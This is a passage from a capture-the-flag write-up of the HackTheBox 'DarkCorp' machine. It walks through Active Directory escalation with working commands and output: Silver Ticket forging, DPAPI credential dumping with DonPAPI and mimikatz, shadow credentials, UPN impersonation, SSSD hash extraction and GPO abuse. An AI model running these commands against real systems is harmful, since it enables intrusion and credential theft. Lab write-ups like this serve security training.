> **⚠️ Warning:** Silver Tickets are difficult to detect as they appear as legitimate Kerberos tickets. Monitor for unusual authentication patterns and consider implementing Kerberos logging for service ticket requests.

**Attack Process:**
With Impacket's `ticketer.py`:

```bash
ticketer.py \
  -user 'darkcorp.htb/WEB-01$' \
  -nthash 'MACHINE_ACCOUNT_HASH' \
  -dc-ip 172.16.20.1 \
  -domain darkcorp.htb \
  -domain-sid 'S-1-5-21-3432610366-...' \
  -spn cifs/web-01.darkcorp.htb \
  Administrator
```

![Silver Ticket Creation](Pasted image 20250216213604.png)

(For the `-domain-sid`, you can discover it using `lookupsid.py` or from an LDAP enumeration. Alternatively, check BloodHound or from the netlogon share. Or with `nxc ldap 172.16.20.1 -u user -p password --get-sid)

Ticketer saves an **Administrator.ccache** file. We can load it:

```bash
export KRB5CCNAME=Administrator.ccache
```

Then we can run a tool like **`wmiexec.py`** (from Impacket) or **`nxc smb 172.16.20.2 --use-kcache`** to confirm. We should have administrative privileges:

```bash
wmiexec.py -k -no-pass darkcorp.htb/Administrator@172.16.20.2
```

We can now read the **User Flag** on `WEB-01` as the *Local Administrator*.  

---

## DPAPI Secrets Extraction - Credential Harvesting

On `WEB-01`, a typical next step is to harvest credentials from the local machine, especially **DPAPI** secrets, because the local Administrator’s DPAPI might store additional credentials. Tools like [DonPAPI](https://github.com/megadose/donpapi) automate DPAPI extraction:

```bash
➜  Darkcorp KRB5CCNAME=Administrator.ccache donpapi collect -t 'web-01.darkcorp.htb' -k --no-pass
[💀] [+] First time use detected. Creating home directory
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/mh1lux5/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/mh1lux5/.donpapi/recover/recover_1739741835
[WEB-01.darkcorp.htb] [+] Starting gathering credz
[WEB-01.darkcorp.htb] [+] Dumping SAM
[WEB-01.darkcorp.htb] [$] [SAM] Got 4 accounts
[WEB-01.darkcorp.htb] [+] Dumping LSA
[WEB-01.darkcorp.htb] [+] Dumping User and Machine masterkeys
[WEB-01.darkcorp.htb] [$] [DPAPI] Got 4 masterkeys
[WEB-01.darkcorp.htb] [+] Dumping User Chromium Browsers
[WEB-01.darkcorp.htb] [+] Dumping User and Machine Certificates
[WEB-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager
[WEB-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
[WEB-01.darkcorp.htb] [+] Gathering recent files and desktop files
[WEB-01.darkcorp.htb] [+] Dumping User Firefox Browser
[WEB-01.darkcorp.htb] [+] Dumping MobaXterm credentials
[WEB-01.darkcorp.htb] [+] Dumping MRemoteNg Passwords
[WEB-01.darkcorp.htb] [+] Dumping User's RDCManager
[WEB-01.darkcorp.htb] [+] Dumping SCCM Credentials
[WEB-01.darkcorp.htb] [+] Dumping User and Machine Vaults
[WEB-01.darkcorp.htb] [+] Dumping VNC Credentials
[WEB-01.darkcorp.htb] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

![DonPAPI Execution](Pasted image 20250216213659.png)

We discover the Administrator’s password.

```
But_Lying_Aid9!
```

Hence, we confirm the local Administrator password on `WEB-01`.

![Administrator Password Found](Pasted image 20250216213740.png)

---

## Password Spray Attack - Domain User Discovery
Having the administrator password, we try to crack the credentials file on the server

![Credentials File](Pasted image 20250216191818.png)

![Mimikatz Execution](Pasted image 20250216191750.png)

```
.\mimikatz.exe "token::elevate" "dpapi::masterkey /in:C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500\6037d071-cac5-481e-9e08-c4296c0a7ff7 /sid:S-1-5-21-2988385993-1727309239-2541228647-500 /password:But_Lying_Aid9!" exit`
```

![Master Key Extraction](Pasted image 20250216191836.png)

```
.\mimikatz.exe "token::elevate" "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E /masterkey:ac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da" exit`
```

![Credential Extraction](Pasted image 20250216191922.png)

Armed with potential knowledge of domain accounts and the new local Administrator password or other discovered secrets, we might attempt a domain-wide password spray. Alternatively, we might use BloodHound to find interesting user accounts. So we gather a user list from LDAP and systematically attempt logons with a dictionary or known patterns.

![Password Spray Results](Pasted image 20250216191940.png)

![John.w Credentials](Pasted image 20250216213816.png)

![Domain User Found](Pasted image 20250216213823.png)

Eventually, we discover that `john.w` in the domain uses a certain password:

```
john.w : Pack_Beneath_Solid9!
```

---
## Bloodhound with DNSCHEF

Sometimes when running bloodhound through a proxy, we can get some problems when trying to query for the DNS name, for that, we can use `dnschef` to force the right name resolution.

1. Configure the `dnschef`
![DNS Chef Configuration](Pasted image 20250216214118.png)
2. Run `bloodhound-python`
![BloodHound Python](Pasted image 20250216214133.png)

---

## Shadow Credentials Attack - Privilege Escalation

Enumeration in BloodHound reveals that **`john.w`** has **GenericWrite** privileges over the user object **`angela.w`** in AD. This means `john.w` can modify certain attributes of `angela.w`, including **msDS-KeyCredentialLink**, enabling a *Shadow Credentials* or *Key Credentials* Attack.

![BloodHound GenericWrite](Pasted image 20250216214150.png)

### Understanding Shadow Credentials Attack

**What is Shadow Credentials?**
Shadow Credentials is an attack technique that allows us to add our own certificate to a target user's `msDS-KeyCredentialLink` attribute, enabling us to authenticate as that user using PKINIT (certificate-based Kerberos authentication).

**Attack Process:**
1. **Certificate Generation** - Generate a certificate + private key pair locally
2. **Attribute Modification** - Embed the public key portion into `angela.w`'s `msDS-KeyCredentialLink` attribute
3. **PKINIT Authentication** - Authenticate as `angela.w` using the certificate, because AD now sees that certificate as belonging to `angela.w`

**Why This Works:**
- The `msDS-KeyCredentialLink` attribute stores public keys for certificate-based authentication
- Users with `GenericWrite` permissions can modify this attribute
- PKINIT allows authentication using certificates instead of passwords
- Once the certificate is added, we can authenticate as the target user without knowing their password

**Prerequisites:**
- `GenericWrite` permissions on the target user object
- Tools like `pyWhisker`, `Certipy`, or `PinkHunny` to perform the attack

> **💡 Tip:** Shadow Credentials attacks are particularly dangerous because they don't require password knowledge and can be performed with just `GenericWrite` permissions. Regularly audit ACLs and monitor for changes to `msDS-KeyCredentialLink` attributes.

Tools that can do this easily include:

- **pyWhisker**  
- **Certipy** (with the `shadow` command)  
- **PinkHunny** scripts  

For instance, using `pywhisker`:

```bash
pywhisker -d darkcorp.htb -u "john.w" -p "Pack_Beneath_Solid9!" \
  --target "angela.w" --action "add"
```

![pyWhisker Execution](Pasted image 20250216214215.png)

This writes a new KeyCredential to `angela.w`. It also exports a `.pfx` file we can use for PKINIT.  

We then request a TGT for `angela.w` with the newly minted certificate:

```bash
/opt/PKINITtools/gettgtpkinit.py \
  -cert-pfx ./angelaW-shadow.pfx -pfx-pass <PASSWORD> \
  darkcorp.htb/angela.w \
  angela.w.ccache
```

We can optionally extract the NT hash as well:

```bash
KRB5CCNAME=angela.w.ccache getnthash.py -key <AS-REP-key> darkcorp.htb/angela.w
```

![Shadow Credentials Success](Pasted image 20250216214239.png)

---

## Kerberos ENTERPRISE Name-Type Abuse - Domain Admin Impersonation
REFERENCE: https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/ (DEFCON VIDEO)

Now, we have `angela.w` privileges, but we want to become an even more privileged user, *`taylor.b.adm`*.

**Understanding Kerberos ENTERPRISE Name-Type Abuse:**

In certain "mixed" Kerberos scenarios (Linux hosts that also trust AD, GSSAPI, or *SSSD* is configured to allow `ENTERPRISE` name-type logins), you can abuse the UPN (User Principal Name) to impersonate other users.

**How It Works:**
- You can set the `userPrincipalName` of an account to the UPN of another user
- Then request a TGT with "NT-ENTERPRISE" set, effectively impersonating that other user
- The Linux system sees the certificate as belonging to the target user due to the UPN match
- This allows you to authenticate as a higher-privileged user without knowing their password

> **⚠️ Warning:** Kerberos ENTERPRISE name-type abuse is a sophisticated attack that exploits mixed Kerberos environments. Monitor for UPN modifications and consider implementing additional authentication controls for privileged accounts.

**Attack Steps:**

1. **UPN Modification** - Change `angela.w`'s `userPrincipalName` from `angela.w@darkcorp.htb` to `taylor.b.adm@darkcorp.htb`
   
   Using [bloodyAD](https://github.com/CravateRouge/bloodyAD):
```bash
bloodyAD --host 172.16.20.1 -u 'john.w' -p 'Pack_Beneath_Solid9!' -d darkcorp.htb set object -v "taylor.b.adm" angela.w userPrincipalName
```

**Output:**
```
[+] angela.w's userPrincipalName has been updated   
```

![UPN Modification](Pasted image 20250216214410.png)

1. **Request** a TGT specifying `NT_ENTERPRISE` principal:

![TGT Request](Pasted image 20250216214452.png)

![Enterprise Principal](Pasted image 20250216214507.png)
   
   In effect, the Linux machine joined to the domain sees the certificate for the account it believes is `taylor.b.adm`.

2. Use that TGT to log into the Linux host `drip.darkcorp.htb` as `taylor.b.adm`. By design, if the Linux box sees `taylor.b.adm` as a domain admin or a user with root-sudo rights, you can simply do a `ksu taylor.b.adm`

![Linux Access as taylor.b.adm](Pasted image 20250216214749.png)

---

## Linux Privilege Escalation - SSSD Credential Extraction

Once on the Linux host as `taylor.b.adm`, we effectively have root or can escalate via standard domain-level privileges for that user. We can see that the system is configured for domain-based SSSD (System Security Services Daemon). Checking `/etc/sssd/sssd.conf` shows:

![SSSD Configuration](Pasted image 20250216214857.png)

```
cached_credentials = true
```

Hence, SSSD caches domain credentials locally in `/var/lib/sss/db/`. If we have root access, we can read these databases or TDB files. Tools like `tdbdump` or a simple hex read can reveal password hashes for domain accounts—especially for `taylor.b.adm`, or possibly others. We see something like a `$6$`-style shadow hash:

Looking at the `var/lib/sss/` we see various `tdb` files, we can tar all of this archives and send to our machine with `tar -cvf file.tar *`, after sending to our machine, we untar with `tar -xf file.tar`, we can analyse this files with `tdbtool`, using the `dump` command we see a reference to cached password on the hexdump

![SSSD Database Analysis](Pasted image 20250216214911.png)

```bash
➜  sss cat hexdump | awk '{for (i=2;i<=NF;i++) {if ($i ~ /^[0-9A-Fa-f][0-9A-Fa-f]$/) {if ($i==24 && !matches){matches=1} if (matches) {if ($i == "00") {matches = 0; printf "\n"; exit} else {printf "%s",$i}}}}}' | xxd -r -ps

$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.%
```

We crack it with **Hashcat** or **John** to recover `taylor.b.adm`’s real domain password.  

![Password Hash Cracked](Pasted image 20250216215010.png)

---

## GPO Abuse - Final Domain Admin Escalation

Armed with `taylor.b.adm` domain credentials, we can confirm membership or evaluate group policy objects (GPOs). Often, if `taylor.b.adm` is not already domain admin, it might have delegated rights to modify a GPO that runs on domain controllers or critical servers. Tools like [pyGPOAbuse](https://github.com/HackAndDo/pyGPOAbuse) let us create scheduled tasks or commands via GPO modifications.

![GPO Analysis](Pasted image 20250216215031.png)

```bash
pygpoabuse.py darkcorp.htb/taylor.b.adm:'!QAZzaq1' \
  -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 \
  -command 'net localgroup Administrators DARKCORP.HTB\taylor.b.adm /add' \
  -taskname "LocalAdmin" -description "pop" -dc-ip 172.16.20.1
```

**Command Breakdown:**
- `pygpoabuse.py` - Tool for abusing Group Policy Objects
- `darkcorp.htb/taylor.b.adm:'!QAZzaq1'` - Domain credentials
- `-gpo-id` - Specific GPO to modify
- `-command` - Command to execute via scheduled task
- `-taskname` - Name for the scheduled task
- `-dc-ip` - Domain controller IP address

![GPO Abuse Execution](Pasted image 20250216215112.png)

This creates a scheduled task to add `taylor.b.adm` to the *Administrators* group domain-wide or on the DC. After the next GPO refresh, you are effectively in the Domain Admins group.  

![Domain Admin Achieved](Pasted image 20250216215128.png)

That’s it! You now have full control of the domain environment.

---

## Conclusion

This machine demonstrates an incredibly complex attack chain that showcases multiple advanced techniques commonly found in real-world Active Directory environments. The path from initial web application compromise to Domain Admin privileges involved:

### Key Attack Vectors:
1. **XSS in Roundcube Webmail** - Intercepted password reset tokens
2. **PostgreSQL Injection with Filter Evasion** - Achieved RCE through advanced SQL techniques
3. **NTLM Relay Attacks** - Compromised DNSAdmin account through HTTP-to-LDAP relay
4. **Kerberos Relay via DNSAdmin** - Used PetitPotam and krbrelayx to steal machine certificates
5. **Silver Ticket Forgery** - Gained local Administrator access using machine account hash
6. **DPAPI Secrets Extraction** - Harvested cached credentials from Windows systems
7. **Shadow Credentials Attack** - Escalated privileges using KeyCredentialLink manipulation
8. **Kerberos ENTERPRISE Name-Type Abuse** - Impersonated higher-privileged domain users
9. **GPO Abuse** - Achieved final Domain Admin privileges through Group Policy manipulation

### Technical Highlights:
- **Multi-stage pivoting** from web application to domain environment
- **Advanced Kerberos attacks** including relay and name-type abuse
- **Cross-platform exploitation** involving both Linux and Windows systems
- **Credential harvesting** through multiple techniques (DPAPI, SSSD, etc.)
- **Active Directory privilege escalation** using various delegation and ACL abuses

---

## Alternative Attack Paths

By the time this machine was released, there were alternative attack paths discovered that could shortcut parts of the main attack chain, by now some of them might be patched:

### 1. Command Injection 
In the web app, there was a direct OS command injection point that circumvent the entire relay and silver ticket process because the user had `SeImpersonatePrivilege`.

![Command Injection Alternative](Pasted image 20250216215225.png)

### 2. Brute Forcing Taylor.b.adm creds

Bruting `taylor.b.adm` credentials with kerbrute with the `rockyou` list, we can find his creds, skipping all of the attack chain

![Brute Force Alternative](Pasted image 20250216220515.png)

---

This machine represents one of the most complex attack chains in HackTheBox, requiring deep understanding of:
- **Web application security** (XSS, SQL injection, file inclusion)
- **Active Directory security** (NTLM relay, Kerberos attacks, delegation)
- **Cross-platform exploitation** (Linux and Windows privilege escalation)
- **Advanced credential harvesting** (DPAPI, SSSD, certificate theft)
- **Group Policy and ACL manipulation** for final domain compromise

The combination of these techniques makes DarkCorp an excellent learning platform for understanding real-world enterprise security challenges and the sophisticated attack chains that modern adversaries employ.
